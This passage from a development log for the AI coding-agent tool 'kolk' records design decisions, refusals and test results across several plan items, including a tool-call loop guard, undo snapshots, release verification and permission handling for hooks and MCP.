fifty. The saga's `StopDoomLoop` (threshold 3) is the right shape at the wrong altitude, counting
failed *chapters*, so a chapter that spends its whole budget spinning inside one turn never registers
a failure to count. Two empty completions and 429 rotation cover their own narrow cases.

**The rule: three consecutive calls with identical canonical arguments *and* identical results.**
Both halves required. The results half is the load-bearing one and it answers the item's hardest
question — whether a repeat that succeeded counts. Success is the wrong discriminator: a test that
fails *differently* each run is progress, because the error is moving; a read that succeeds
identically three times is waste even though every call returned fine. What separates progress from
repetition is whether anything changed, and the observable form of that is the result bytes.

It also disposes of the obvious false positive without a special case. A model that runs a test, edits
a file and runs the test again has not made three *consecutive* identical calls — the edit is between
them. Only a model repeating a call with nothing in between trips the guard, and that model is not
testing anything.

**Only canonical re-serialization is normalized** — sorted keys, no insignificant whitespace, because
providers re-serialize the same call differently. Not trimmed paths, not lower-cased strings, not
"similar" arguments. An edit whose `old_string` differs by one space is a different edit, and merging
it with its neighbour would fire the guard on work that is progressing. Over-normalizing turns a
safety device into a source of false stops, which is how safety devices end up switched off.

**Three, and not scaled with effort.** Effort buys more work, not more permission to repeat the same
work; a threshold rising with effort means the larger the budget, the longer kolk will burn it
achieving nothing. Three also matches the saga's default, so there is one vocabulary and one knob.

**The response is tiered, and the full-auto case is the interesting one.** The call is never executed.
Interactive tiers ask, and "run it again" resets the counter. `/full-auto` **aborts the turn** rather
than proceeding: its contract is that it does not stop to ask, but "proceed anyway" is precisely what
the guard exists to prevent, and a guard that yields in the mode with the largest budget is
decoration. It is logged with tool, arguments and count, the same shape item 13 gave path confinement
in full-auto. A subagent gets an auto-denial naming the loop — item 13 auto-denies in children what
the tier would ask about — and a second trigger ends the child's turn, because a child that loops, is
told, and loops again is not recovering.

**An injected "you appear to be looping" notice was rejected as the primary response:** it costs a
round trip, it is advice a looping model is by construction bad at taking, and it leaves the call
executed. It belongs as the *text of the denial*, where the model has to react to it.

**Two refusals.** No "always allow this tool" — it would mean "always allow me to spend your budget
achieving nothing", and would disable the guard for every future loop in the session to get past one
call; the one-time "run it again" costs the user a decision instead of the guard. And the guard is
**not a permission rule and must not be expressible as one**: `allow bash(*)` answers "is this
dangerous?", while this answers "is this futile?" — collapsing them would let a reasonable permission
rule silently remove a spending guard.

Four build leaves queued (L30.1–L30.4), including one that exists to prove the ceiling is no longer
doing the detector's job.

Acceptance checklist:

- [x] the existing guards read from code first; the item's `Today` line corrected by what was found.
- [x] the hard question (does a successful repeat count) answered with a signal, not a heuristic.
- [x] the false positive the naive rule produces shown to be excluded by the rule itself.
- [x] every tier's behaviour decided, including the two where nobody is there to ask.
- [x] two refusals recorded with the reasoning that makes them hold.
- [x] full `make check` green.

### Item 32 hardened — recorded detail

The first of the three borrowed items, and the one that fixes a hole rather than adding surface:
`/undo` restores what kolk's own file tools changed and nothing else. A formatter, a codegen step or
an `rm` run through `bash` is invisible to it. The README says so, which is honest and is not a fix —
the user's model is "kolk changed my files, kolk can put them back", and the carve-out sits exactly
where a destructive turn lands.

**Both stores, and not as a hedge.** The item guesses "probably both"; the answer is definitely both,
because each covers what the other cannot. The copy store is the only one that works in a directory
that is not a repository, or on a machine without `git`. The shadow store — a git object store
outside the work tree, driven with an explicit `GIT_DIR` and `GIT_WORK_TREE` — is the only one that
sees what `bash` did.

**Measured, not guessed.** On this repository (544 tracked files, a 222 MB `.git`, git 2.55.0) with
`objects/info/alternates` pointing at the real object store: the first snapshot costs **63 ms**,
every later one **15 ms**, and the store is **148 KB**. The alternates trick is what makes the last
number possible — blobs already in the project's store are referenced rather than rehashed. Against a
turn that takes seconds, 15 ms is not a cost worth arguing about.

**Two properties were verified rather than assumed, because they are the entire reason to do this.**
A `sed -i` against `README.md` — the shape of a formatter or a codegen step — appeared in the shadow
store as `M README.md`. And the user's own `git status --short` reported zero lines throughout: no
index entry, no stash, no reflog motion. That second one is the property the whole design exists to
protect, and it is written down as a test that must never be deleted.

**No git version is checked**, and the doc says why: a version comparison is a guess about which
release added what, made once and never revisited. The probe is the operation itself — create the
store, configure it, snapshot once — and any failure, on any git, for any reason, drops the session
to the copy store and says so once. A feature test cannot be wrong about the machine it is on.

**Cadence is per turn**, which is what `/undo` and `/rewind` already mean and what the existing port's
`BeginTurn` already provides; a per-tool-call snapshot would multiply the cost to record intermediate
states nothing can address. `Record(tool, path)` stays meaningful for the copy store and becomes a
no-op for the shadow one, because a whole-tree snapshot already contains every path.

**Three refusals.** No background `git gc` — a daemon collecting garbage in a store the user cannot
see, on a schedule they did not choose, is the surprise this project refuses everywhere else; the
bound is session deletion, and if that proves too generous the fix is a visible number in config. No
exposure of the store as a branch or through `/diff --since` — that would promote a storage strategy
to an interface, and there is no branch to offer in a directory that is not a repository. And no
commits in the user's history, which would contradict item 28's refusal of branch-per-session and of
a `/commit` that commits.

**Nothing migrates**, deliberately: existing sessions keep their `.bak` files and keep rewinding from
them, and the manifest records which strategy captured each turn — so a session that gains `git`
halfway through rewinds each turn the way that turn was captured.

Five build leaves are queued (L32.1–L32.5); this item's bar was the strategy, cadence, retention and
failure modes in writing, and that is what landed.

Acceptance checklist:

- [x] the cost measured on a real repository instead of estimated.
- [x] the safety property — the user's git untouched — verified experimentally, and named as a permanent test.
- [x] the invented "git ≥ 2.20" floor in the first draft replaced by a feature test, with the reasoning.
- [x] every Decide bullet resolved, including three refusals and the migration answer.
- [x] full `make check` green.

### Item 19 hardened — the last unhardened item — recorded detail

The only item where almost nothing was built, which made it the only one that was a decision rather
than a record. **No desktop app and no iPad app** — and not for the reason the item assumed. It
frames desktop as a stack choice deferred until the daemon protocol exists; the protocol exists now,
and the stack was never the hard part.

**Three of the four things a desktop shell would add already shipped.** A dashboard (`kolk dash`,
server-rendered, no script, no assets), a session browser (`kolk sessions`), several sessions at once
(item 27's overview with advisory locks). The fourth, OS notifications, is real and is the entire
remaining case — and it argues for a 200-line notifier watching the event stream, not a second
application with a webview runtime, a signing identity, notarization (which item 20 refuses precisely
until this day) and its own update path. The condition for revisiting is written down so it can be
met rather than argued: more than one person running several sessions at once who says the terminal
is where the work gets lost. Not "a GUI would be nice".

**The stack was decided anyway**, because leaving it open is how a project gets the default instead
of the choice: Tauri v2 with `kolk serve --stdio` as a sidecar. The cgo rule decides it — Wails v3
sets `CGO_ENABLED=1` on darwin and linux and wants gtk4/webkitgtk, putting a toolchain inside the Go
build, while a sidecar keeps the Go binary exactly what it is and talks over an exit that already
exists, is tested and is versioned. Wails being in beta is the smaller objection. Electron is the
sidecar model with a larger runtime and no compensating benefit.

**iPad: refused, with a sharper reason than item 26's.** Native mobile apps already cost two release
trains between a fix and its users, but the decisive point is that iPadOS cannot spawn a shell or a
toolchain, so code mode cannot exist locally at all — a native app could only ever be chat, the
weakest thing kolk does. The built answer is kolk on a real machine, reachable over Tailscale, with
the iPad as a client. That is not a lesser iPad app; it is the version where the code runs on a
machine that can compile it.

**Of the four protocol constraints the item asks about, three are met and one is not.** Streaming
with resumption, loopback auth with paired devices, and versioning are all built. **Session
multiplexing is not**: `bus.New` takes a session, `kolk serve` serves exactly one, and there is no
way to follow several over one connection. Item 27 answered "many sessions, one view" by reading
session headers and taking an advisory lock instead — right for a viewer, wrong for an application
holding a socket. It stays unbuilt deliberately: its only justifying consumer is the application this
item just declined, and building it now would be building for a hypothetical client. It is recorded
as the first thing anyone reopening the desktop question must do.

**Three claims in the plan turned out to be fiction, and were found by looking at the tree rather
than reading the document.** Item 2 said three nested modules were "pre-carved and empty" —
`desktop/`, `bind/` and `tools/` do not exist. Item 2 said `modernc.org/sqlite` is "the one heavy
dependency" — it was never added; the dashboard shipped with no database and `internal/dash` is one
file. And item 21, written yesterday by me, repeated the `tools/` claim without checking it. All
three are corrected in place with a dated note rather than quietly edited, because a document that
silently revises itself teaches nobody anything.

**L19.1** turns that last finding into a control. The layer table had allowed `internal/dash` to
import `modernc.org/sqlite` and `modernc.org/libc` on the strength of a claim that never became
true — quietly pre-approving a 400-file dependency for a package that had decided against one. The
allowance is gone, and a rot test now fails on any allowance nothing imports: the same shape as the
dead-export allowlist's rot test, for the same reason. It failed on exactly the two stale entries
when written, which is the red step arriving for free.

With this, **every item from 1 to 29 is hardened or part-done by design**, and only the borrowed
items 30–32 remain.

Acceptance checklist:

- [x] the desktop question answered on evidence — three of four benefits already shipped — rather than deferred again.
- [x] a stack chosen despite the refusal, so the decision is not left to a future default.
- [x] the one unmet protocol constraint named, and deliberately left unbuilt with the reason.
- [x] three false claims in the plan found by inspection and corrected with dated notes.
- [x] the rot test written against the stale entries it found, then the entries removed.
- [x] full `make check` green: 2,083 tests, 0 lint issues, plan 86 checks.

### Item 23 hardened — recorded detail

This item proposed phases running v0.1 through v1.0 and "later, iPad". The shipped version is
**v1.2.1**, and every milestone in that list except the desktop app and a frozen daemon API has been
passed — two of them, MCP and sandboxing, by *deciding not to do them*, which is a thing a version
number cannot express. Rewriting the roadmap to say what is true was most of the work.

**Scope amendment, 2026-09-01:** the paragraph above is the historical item-23 decision. V34.0c
supersedes its sandbox disposition: OS-level sandboxing is now accepted v1 scope under V34.1e;
MCP remains deferred.

**Version-numbered phases were replaced by the phase letters actually in use.** A–J, one `/loop`
each, already in PLAN.md and already how the work runs. Version numbers were a proxy for ordering,
and the phases are the ordering. The rule they encode is worth restating: finish what is half-built
before starting what is unbuilt, correctness before the surface that displays it, permissions before
autonomy — the last clause being why phase E preceded F, since an orchestrator that can spawn
subagents before a permission floor exists is a machine for doing the wrong thing quickly.

**Done is defined against numbers that already fail the build.** `make check` is fifteen gates, and
the numeric ones fail rather than warn. The one measurement deliberately left outside the gate is
cost per task: it is recorded by `kolk stats`, which is what the item asked for, but making it a
budget would fail builds for a model price change nobody here controls.

**The non-goals were collected, not invented** — twenty lines, each naming the item that argued it
and the condition that would change the answer. Two are marked as exceptions rather than smuggled in
with the rest. A hosted service and cloud sync are decided *here*, because no item had been forced to
decide them, and saying "refused in item 12" would have been fiction — item 12 never mentions either.
Windows is *deferred, not refused*: item 2 names a Windows CLI as a target, and demoting a target to
a principle because it is convenient for a table is exactly the drift this item is supposed to
prevent. Both attributions were checked against the documents before they were written down, and both
were wrong in the first draft.

**GitHub milestones are refused**, for the reason item 22 refused a docs tree: a second copy of the
phase list, in a system that is not versioned with the code, drifts the first week someone reorders a
phase in a commit. PLAN.md and CHECKPOINTS.md are the roadmap, they review in a diff, and as of this
item they check each other.

**L23.1 — the plan's bookkeeping is a claim, and it had no guard.** An audit on 2026-08-27 found the
phase table four phases stale, still calling built phases "queued". A tick with no document is the
same rot one step earlier. The contract: `[x]` requires a document that says `Status: hardened`;
`[~]` permits a document but forbids one that claims to be hardened; every document must have an
item; every `docs/plan/` link in PLAN.md must resolve. 81 checks, in `make check` and in CI.

Its first draft also demanded that every `[~]` item have a document, and item 1 immediately failed —
it records its decisions inline in PLAN.md and predates the convention. That is a legitimate shape,
so the rule was relaxed rather than the plan rewritten to satisfy it. Three mutations confirm it
bites: ticking item 19 (no document), breaking a link, and adding `Status: hardened` to item 24's
part-done document.

**L23.2 — the README now carries the roadmap and the refusals**, because someone deciding whether to
use kolk needs the non-goals more than the phases, and "no telemetry, no cloud sync, no hosted
service" is the part of this project's design that is hardest to verify by reading code.

Acceptance checklist:

- [x] the roadmap rewritten against the shipped version rather than the proposed one.
- [x] every non-goal traced to the item that refused it; two exceptions marked rather than hidden.
- [x] two wrong attributions caught by checking the documents before committing.
- [x] the ratchet mutation-tested three ways, and relaxed where it overreached instead of forcing the plan to fit.
- [x] GitHub milestones refused with the same reasoning as item 22's docs tree.
- [x] full `make check` green.

### Item 22 hardened — recorded detail

A documentation item is the easiest thing in this plan to write fiction about, so this one began by
running the binary rather than reading about it: a fresh build, an empty HOME, no key. `kolk "hello"`
prints three lines, names the exact command to fix it, and exits 0. The first-run path was already
right, and most of what the item asked for around it was either built or should not be built.

**Three refusals.** OAuth "login with OpenRouter": pasting a key is one command against something
already in the clipboard, while the flow costs a redirect listener, a token store with its own expiry
and refresh semantics, a second class of auth failure to diagnose, and a browser on a machine that is
frequently a remote shell. A first-run mode picker: every question asked before the first turn is
asked before the user knows what the answers mean. `/help` per mode: a help list that is a different
document each time it is read is exactly the confusion a flat list avoids. Demo GIFs joined them —
a recorded terminal is a binary blob that ages the moment the UI moves, cannot be diffed or tested,
and looks authoritative while being wrong, which is the same condition item 21 attached to golden TUI
tests.

**The eight-file `docs/` tree was refused as specified, and replaced with something with teeth.**
`kolk help` and `kolk help <command>` are generated from the command table, so they cannot drift; a
prose tree covering commands, config, modes, effort, saga, dashboard, providers and subscriptions
would be a second source of truth for facts that already have one. The real failure mode of
user-facing docs is not incompleteness — it is fiction, and this repository produced two examples in
a week. The README's own first line told people to run `go build -o kolk .` against a root that holds
no main package, so the first command a new user typed returned an error. And an error message
drafted during item 21 recommended `kolk doctor`, which that same document queues as unbuilt; it was
caught by reading, which is not a control.

**L22.2** makes it a control. Every `kolk <command>` in the README — in backticks or a fenced block,
never in prose, because "kolk asks" and "kolk contacts" are sentences — must name a command in the
table, and every slash command in the welcome must exist in the slash table. The rule never demands
that a command *be* documented: `kolk help` is the complete reference and a tour that omits
`kolk completion` is fine. Only invention fails. Both halves were mutation-tested: inserting
`kolk doctor` into the README fails, and renaming `/mode` to `/moode` fails.

**L22.1 — the orientation line.** The status line reports mode, effort, model and tier; what it
cannot report is that all of them change mid-conversation, which is the one thing that makes the
dials worth having and the one thing a first-time user cannot discover. A new session now gets
"Switch anytime with /mode, /effort or /model. Each lists its options."; a **resumed** session does
not, because an orientation repeated every time is noise and noise is what people learn to skip.

The first draft spelled out every value and was worse twice over: it wrapped across two lines at 72
columns, and the phrase "mid-session: " tripped an existing guard forbidding duplicated `session: `
metadata in the startup transcript. A test written six weeks earlier caught prose, which is the kind
of accident that only happens when the guards are about properties rather than strings.

Acceptance checklist:

- [x] the first-run path observed by running the binary in an isolated HOME, not inferred from code.
- [x] both new tests written red first; both mutation-tested afterwards.
- [x] every Decide bullet resolved: four refusals, two builds, the rest recorded as already built.
- [x] one claim about the site checked before committing (it shows the logo, not a screenshot).
- [x] full `make check` green: 2,082 tests, 0 lint issues.

### Item 21 hardened — recorded detail

The plan's `Today` line for this item said "22 offline tests incl. e2e via mockrouter". There are
2,078 across 170 files and no package called mockrouter — the e2e path is 38 `httptest` sites. That
staleness is the item in miniature: the testing question stopped being "write more" a long time ago
and became "which kinds are worth having".

**Two refusals, and they are the useful part.** Golden output tests for the TUI: a golden frame
asserts every pixel of a layout that is still moving, so it fails on every deliberate change and
trains the reviewer to regenerate without reading — coverage-shaped, and worse than nothing. The TUI
is tested on properties that do not move instead, and this project has already been bitten by the
alternative: three TUI tests were vacuously green because the overlay flattened the diff onto one
row. Property tests for the edit tool: "applying an edit does what the edit says" is the
implementation restated. The invariants that matter are specific — a non-matching edit changes
nothing, a rune is never split, a path outside the root is refused before the file opens, a write is
atomic — and each is already asserted directly. Fuzzing the SSE reader and tool-argument decoding is
accepted, because those are the two places bytes from a third party become control flow.

**L21.0 — the error matrix, built rather than tabulated.** A matrix in a document that nothing
executes is a wish. `provider.Advise(err) (Advice, bool)` maps 401, 402, 403, 404, 408/504, 429, 5xx,
a 400 that is really a context overflow, a 400 that is really a model without tool support, and a
mid-stream disconnection onto a summary and a next action — and returns false for everything else,
so an unrelated error does not grow vague commentary. The tests assert shape as well as content: a
summary that ends in a full stop or runs past 90 characters fails, because these lines are read by
someone who is already annoyed.

Three design points are load-bearing. Advice never displaces a `GuidedError`'s own hints — the
command knows more than a status-code table does. Advice prints at **all three** places a turn can
fail: the one-shot command, the plain REPL and the TUI, through one `writeAdvice`, with a test that
fails if a fourth site appears without it. The interactive paths are where a person actually meets a
401, and wiring only the one-shot path would have missed the common case; removing the wiring was
run as a mutation and four tests caught it. And building this moved `IsContextOverflow` from the
engine down into `internal/provider`, so the phrase list has two callers rather than two copies.

**One near-miss worth recording.** The transport advice originally said "and `kolk doctor` if it
looks fine from here" — a command this very document queues as unbuilt. Caught before commit and
reworded to name `--base-url`, which exists. Advice that recommends a command the binary does not
have is worse than no advice.

**The checklist names what holds each line, including the two that nothing holds.** `ci.yml`'s
actions still float on `@v5`/`@v6` while the release and smoke workflows pin by digest — bounded,
since those jobs can only read, but real, and queued as L21.4. And prompt injection is undefended:
nothing detects text addressed to the model inside a file it reads. What limits the damage is the
permission floor, not detection — an injected instruction still has to get a tool call past it — and
`/full-auto` is exactly where that stops being true, which is why it logs what it reaches for. The
doc says this instead of claiming resistance, and provenance tracking is named as a future item
rather than an implied one.

Three claims were corrected against the code before committing: there is no OS keychain backend
(keys are a 0600 manifest written atomically under a lock, with the prototype's `config.json` key
migrated out manifest-first), the module budget fails above two rather than at three, and item 33
does not exist.

Acceptance checklist:

- [x] `Advise` written test-first: nine failure classes, shape assertions, and silence for the rest.
- [x] the wiring mutation-tested — disabling it fails four tests, not zero.
- [x] all three failure sites covered, with a test that catches a fourth being added without advice.
- [x] every Decide bullet resolved: two refusals, one acceptance queued, one built.
- [x] the security checklist's two gaps named rather than papered over.
- [x] `kolk doctor` referenced by nothing shipping, so no unbuilt command is promised.
- [x] full `make check` green: 2,078 tests, 0 lint issues.

### Item 20 hardened — recorded detail

Item 20 is the clearest case yet of a plan item that had been built without being decided. The
installer, four signed archives, `kolk update`, the two-OS matrix, lint, the failing budgets, the
tag-only release workflow and the public verifier were all already in the tree; the doc's first job
was to write down what exists, and its second was to answer three questions that had never been
settled.

**Three answers, two of them refusals.** No Homebrew tap yet — GoReleaser's `brews:` block makes it
a ten-line change, which is precisely why it can wait, and a tap that lags the release teaches people
that `brew upgrade` does not get them the current kolk. No macOS notarization for the CLI — `curl`
does not set `com.apple.quarantine`, so Gatekeeper never evaluates the binary the install script
places; it becomes mandatory the day item 19 ships something with an icon. And no automatic version
check, ever: it is a phone-home by another name, it fires on a schedule the user did not choose, and
it leaks *when someone is working*. Confirmed in code rather than assumed — `a.update` is reachable
only from `runUpdate`/`applyUpdate`, and no startup path nudges.

**One honest gap written down rather than papered over.** Both fast paths — `install.sh` and
`kolk update` — verify SHA-256 against a `checksums.txt` fetched from the same origin as the archive.
That catches a corrupted download and a single swapped artifact; it is not evidence against a
compromised origin. The signature would be, and verifying a Sigstore bundle costs either a `cosign`
users do not have or a module tree that breaks the two-module gate. So `scripts/verify-release.sh`
is named as the signature-level path instead of pretending a checksum is a signature.

**L20.1 — the weekly live smoke test.** The genuine gap. Every other test in this repo is offline by
construction, which is a good property and also a blind spot: a week of drift in OpenRouter's API
would have been found by a user. `scripts/smoke.sh --real` already existed and nothing had ever run
it. The workflow runs it Mondays at 07:00 UTC and on demand, and four properties keep a live key in
CI defensible — never on a push, opt-in (no secret ⇒ a notice and a green run, not a red build),
fork-proof via a repository guard, and holding the key as tightly as it can: `permissions: {}` by
default, `contents: read` on the job, no `id-token`, the secret referenced exactly once through an
`env` mapping, and both actions pinned by digest like the release workflow's.

The contract came first and failed 15 of 16 checks before the workflow existed. It grew an
eighteenth check worth naming: `smoke.sh --real` defaults to `openrouter/auto`, which **bills**, so
the workflow pins the free model `internal/provider/catalog.go` seeds as the offline fallback — the
weekly run then exercises exactly what a keyless user meets first. Because that id lives in YAML,
nothing but a check stops it drifting, so the test extracts the `--model` argument and fails if it is
not a `:free` id or is not in the catalogue. Both mutations were run: swapping in an unseeded model
and swapping in `openrouter/auto` each fail with the right message.

**L20.2 — the README install section, which was wrong.** It documented one install path (`go build`)
out of three, and documented it incorrectly: `go build -o kolk .` cannot work, because the repository
root holds no main package — it is `./cmd/kolk`. Anyone following the README's first line got an
error. It now covers the install script with its `KOLK_INSTALL_DIR`/`KOLK_VERSION` knobs,
`go install …/cmd/kolk@latest`, a source build, `kolk update` and the refusal to poll, what the
checksum does and does not prove, and the one place quarantine does bite — an archive pulled from the
Releases page in a browser.

Acceptance checklist:

- [x] contract test written first and red (15 of 16) before the workflow existed.
- [x] model-drift ratchet proved by two mutations, each caught with the right message.
- [x] the workflow wired into `make check` and the CI guardrails job, not only into a script.
- [x] every Decide bullet answered, including the two refusals and the one gap.
- [x] the README's broken build command found and fixed; `go build -o kolk ./cmd/kolk` run to confirm.
- [x] full `make check` green: 2,057 tests, 0 lint issues, smoke workflow 18 checks.

### Items 27, 28 and 29 hardened — recorded detail

Phase I's docs are complete, and with item 16 that leaves only items 19–23 unhardened in the whole
plan. Three items in two ticks, and most of the content is refusals — which is the point of hardening
rather than a shortfall.

**Item 27 was largely decided by having built it.** The discovery-versus-supervisor question was
answered by I27.1's advisory lock, and the doc records the cost rather than the win: nothing can start
a session remotely, because that needs a supervisor running before there is anything to supervise. The
decisive field on a card is **blocked** — a session waiting on a permission prompt has stopped, is
spending nothing, needs a person, and looks exactly like one thinking hard. Reading only live
sessions' journal *tails* comes from I27.2's measurement, not taste.

**Item 28 mostly defends a division that already exists.** Kolkrabbi touches git in one place — the
saga's chapter commit — and the rule that justifies it generalises: *do it yourself only when it must
be atomic with something you already own.* Branch-per-session fails that and three more tests: it
moves the user's HEAD, it has no good ending, and checkpoints already isolate an agent's edits
including outside a repository. Bitbucket and Azure DevOps are refused in writing, with the
comparison stated plainly — t3code supports all three and also carries 393 dependencies.

**Item 29 is one feature and two refusals.** Port discovery ships because a dev server's port is the
one fact a user needs and cannot easily get. Supervision is refused because of what it *becomes*:
restart needs to know how it started, logs need somewhere kept, health needs defining per service, and
all three must outlive Kolkrabbi — which is the daemon item 27 refused a tick earlier.

**Resource telemetry is the one worth singling out**, because it was cut on a test rather than a
preference: *name a decision it changes*. Cost per session changes whether to keep going; context
usage changes whether to compact; CPU and memory change nothing a user would do differently. A number
nobody acts on makes a dashboard look busy and teaches its reader to ignore panels.

One consistency carried forward without being asked for: **only loopback ports get a clickable URL**,
by the same reasoning I26.5 applied to Kolkrabbi's own server — printing a LAN link invites a click
that publishes what the user may not have meant to publish.

Acceptance checklist:

- [x] every Decide bullet in all three items resolved, refusals included.
- [x] item 27's decided question recorded with its cost, not just its answer.
- [x] the rule behind item 28's division stated so it generalises.
- [x] telemetry cut against a stated test rather than an opinion.
- [x] four build leaves named across the three items.
- [x] the phase table updated; only items 19–23 remain unhardened.
- [x] full `make check` green: 2,057 tests, 0 lint issues.

### Item 16 hardened — recorded detail

The last item blocking phase G, and the one item 15 deliberately pushed work into: formatter hooks
were sent here on the grounds that "the permission story is the design". It is.

**The order is forced, not chosen.** Markdown commands first because they add no dependency, no
process and no permission surface — a `/name` that expands to a prompt *is* a prompt, judged exactly
as if the user had typed it. Hooks second because they are the opposite: a shell command running with
nobody at the prompt, which is the single thing E13 spent a phase making impossible by accident. MCP
last because it cannot be governed yet.

**Two things the tree already provides made this easier to write than expected.** `Permission.Judge`
ends in `default: return VerdictAsk, "unrecognised tool"` — a tool nobody has heard of already asks
rather than runs, which is exactly the right posture for a third-party tool and is already there. And
`internal/shell` being the only package allowed `os/exec` means every extension's subprocess goes
through one audited door.

**One thing it does not provide is MCP's blocker.** `ruleFamilies` knows `bash`, `read` and `write`.
A tool named `github__create_issue` belongs to none of them, so `allow mcp(github__*)` means nothing
and the only honest posture is asking every time — which makes a twelve-tool server unusable. That is
a real gap with a shape, so MCP is deferred *with a named blocker* rather than "later". The second
blocker is measured rather than asserted: the five built-in schemas are already about 5 KB of every
request, and the research records exactly this failure in Hermes and Goose.

**Refusals, written down rather than left implicit.** No dynamic Go loading, ever — a plugin in the
agent's address space shares its filesystem access, its credentials and its floor. No `pre-tool` hook,
because a hook that can veto a tool call is a second permission system and E13 exists so there is
exactly one. No executable markdown commands, which would be a hook wearing a friendlier name. And no
project hook running unseen: a `.kolk/hooks.json` in a cloned repository is a shell command a stranger
wrote, so cloning must not be enough to execute anything.

**Claude Code's `.claude/commands` are read, not imported.** Someone who already wrote them should not
have to move them to try Kolkrabbi, and a conversion step would make every future divergence our
problem to explain.

Acceptance checklist:

- [x] every "Decide" bullet resolved, including which of the three ship and in what order.
- [x] the file formats specified for commands and hooks.
- [x] the permission story for third-party tools written down, and the existing safe default found rather than invented.
- [x] MCP deferred with two named, checkable blockers instead of a date.
- [x] four refusals recorded with their reasons.
- [x] five build leaves named, one of which (`mcp(...)` rules) is useful before MCP exists.
- [x] full `make check` green: 2,057 tests, 0 lint issues.

### X6 the dead-export backlog — verified detail

X4 left sixteen exported symbols reachable only from tests, marked `untriaged 2026-08-27` in as many
words rather than dressed up as justified. This is the first pass at judging them.

**Deleted, seven.** The four legacy effort aliases — `EffortQuick`, `EffortStandard`, `EffortDeep`,
`EffortUltra` — were constants nothing read: `NormalizeEffort` matches the *strings* `"quick"`,
`"standard"` and so on, and so does the `Efforts` list, so the constants were documentation with a
compiler behind them. Also `atomicfile.WriteJSON`, `shell.Have` and `shell.Quote`, none of which any
caller had ever wanted. Their tests went with them; a test for a function nobody calls tests nothing.

**Kept with a real reason, one.** `MaxTasksForEffort` is an exported wrapper around `maxTasksFor`, and
deleting it broke a test that asserts orchestration width per effort — behaviour worth pinning, and
unreachable from an external test package any other way. It stays, and the allowlist now says that
rather than "untriaged".

**Three investigated and found not to be defects**, which is worth recording because each looked like
one:

- `NewSessionDecider` appeared to mean session-scoped permission retention was never wired. It is
  superseded instead: E13.7 replaced caching an approved *action* with keeping a visible *rule*, which
  is strictly better — a user can see and revoke a rule.
- `NewClaudeSession` is bypassed by `ClaudeBackend`, which builds a `ClaudeSession` directly. That
  looked like a constructor being ignored; the backend deliberately pairs the session with its own
  cancel/release so the process outlives the turn, which B12.7 required and the constructor does not
  do.
- `shell.Quote` looked like a duplicate of the `shellQuote` written for saga commits. It is not:
  `shell.Quote` formats a command for display (`dir $ cmd`), while the saga one escapes a title for a
  shell. Same name, unrelated jobs.

**The second pass finished it. Twelve deleted, four kept, none untriaged.**

Deleted in this pass: `dash.Dist` and its embedded `dist` directory, which served assets the
dashboard stopped having when D17.2 made it server-rendered; `NewClaudeSession`; `NewSessionDecider`
and the whole `SessionDecider` type; and `VerifySagaChapter`. Deleting the last of those orphaned
`VerifyChapterAndPersist`, and **the rule caught the cascade on the next run** — its only production
caller had been the function just removed, and the runner persists separately. That is the ratchet
doing the thing a manual sweep cannot: noticing what a deletion makes dead.

**The review changed one verdict, which is why the review happens.** The instruction said to delete
`NewPlainRenderer`, and it should not be deleted. It is A7.4's event-to-text renderer, built ahead of
its consumer — and I26.7's remote client is exactly that consumer: protocol events rendered as
terminal text. It is waiting for something, not left over from something. Kept, with that written
down.

The three managed-runtime symbols are kept for the same shape of reason: `InstallRuntime`,
`NewManagedRuntime` and `NewRuntimeSpec` cannot run until `L13.5b4` pins a reviewed release, which is
blocked on the owner. Deleting them would mean rebuilding them the day that decision is made.

Net across both passes: **207 lines removed, 46 added**, and every remaining exemption names what it
is waiting for rather than admitting nobody looked.

### S10.11 the repair turn — verified detail

`docs/plan/10-saga-loop.md` §1.1 step 3: "If tests fail, the chapter receives one internal repair
turn to fix the regression. If still failing, the entire chapter's changes are rolled back." The
executor rolled back immediately.

**Why it matters more than it sounds.** Rolling back a nearly-right chapter is expensive in a way the
budget cannot see: the next attempt starts from nothing, pays for the whole chapter again, and can
easily fail the same way. One repair turn is the cheapest possible intervention between "almost" and
"discard everything".

**One attempt, not a loop.** A chapter that cannot fix itself twice will not fix itself at all, and
each attempt is a paid model turn. The test pins that the repairer is called exactly once even when
the gates never pass.

**The repair turn is told what failed, and only what failed.** "Fix the regression" is not an
instruction without the regression, so the failing gates' names and output go into the prompt — and
the passing ones do not, because they are not the subject.

**`AgentRepairer` is separate from `AgentWorker` despite both being one turn**, because they are told
different things. The worker is asked to make a change; the repairer is asked to make a failing check
pass *without going further*. A repair that quietly widens scope is how a bounded chapter stops being
bounded, so the prompt says so outright.

**A repair that itself errors is not a verifier error.** It is simply a chapter that stayed broken,
and the rollback below it is already the right answer. Turning it into an error would have surfaced a
model hiccup as a saga malfunction.

**A signature got shorter on the way.** `VerifyChapter` took a runner and a detector and would have
needed a repairer too; it now takes the assembled `*ChapterVerifier`, which the runner builds. Four
things one object is made of, passed as one object.

Acceptance checklist:

- [x] a failed gate gets exactly one repair turn, then commits if it passes.
- [x] a chapter that stays broken is rolled back and never committed.
- [x] a repair that errors still rolls back, without becoming a verifier error.
- [x] a passing chapter is never repaired.
- [x] with no repairer the previous behaviour holds exactly.
- [x] the repair prompt carries the failing gates' output and not the passing ones.
- [x] wired into `kolk saga run`, not left as a seam nobody calls.
- [x] full `make check` green: 2,064 tests, 0 lint issues.

### S10.10 the provider guard, everywhere and pinned — verified detail

S10.9 closed the gap in `internal/cli`. This asked whether the rest of the tree had it too, and then
found the guard itself had a hole.

**No other package reaches a provider.** Checked three ways rather than assumed: per-package test
times (the slowest are `arch` at 3.9s parsing the tree and `shell` at 1.1s spawning processes — both
explicable, neither network-shaped); every test constructing a `provider.Client`; and every test
calling `paths.Resolve()`. One client is built without a `BaseURL` — `backend_test.go` — and it only
compares pointers, never calling. Four tests resolve real directories and all four set the three
`KOLK_*` variables first.

**But those four exposed a hole in yesterday's guard.** They isolate their directories by hand rather
than through `isolateHome`, and `isolateHome` returns early when the directories are already set — so
the base-URL guard was skipped for exactly the tests that had opted out of the helper. The guard is
now applied first and separately, before that early return, and those tests call it explicitly.

**The guard only fires when nothing else has aimed the client.** A test already pointing at its own
mock keeps it. That matters more than it sounds: a guard that clobbers legitimate setups is a
nuisance, and a nuisance is what gets deleted six months later by someone making an unrelated change
work.

**The property is now under test, not just the line.** `TestIsolationLeavesNoRouteToARealProvider`
asserts that after isolation the base URL is non-blank and points at loopback, and that no key
survived. A one-line guard inside a helper is precisely the sort of thing a future edit removes
silently; this fails instead.

One process note worth recording: I probed the guard by editing `cli_test.go` and then ran
`git checkout` on it — which discarded the refactor in the same file, uncommitted. Restored it, and
re-ran the probe against an exported copy of HEAD instead. Testing a change by mutating the file that
